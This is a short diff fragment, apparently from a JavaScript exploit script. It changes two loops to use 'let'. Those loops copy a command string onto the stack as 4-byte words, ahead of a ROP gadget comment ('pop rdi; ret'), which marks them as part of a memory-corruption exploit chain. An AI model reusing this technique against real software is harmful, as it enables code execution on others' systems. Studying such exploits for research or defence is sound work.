@@ -93,9 +93,9 @@ add(2, RELEASE ? -0x200 : -0x248);
 
 // write command to stack
 while (cmd.length % 4 != 0) { cmd += "\x00" }
-for (i = 0; i < cmd.length / 4; i++) {
+for (let i = 0; i < cmd.length / 4; i++) {
     set(4 + i, 0);
-    for (j = 0; j < 4; j++) { add(4 + i, cmd.charCodeAt(i * 4 + j) << j * 8); }
+    for (let j = 0; j < 4; j++) { add(4 + i, cmd.charCodeAt(i * 4 + j) << j * 8); }
 }
 
 // pop rdi; ret
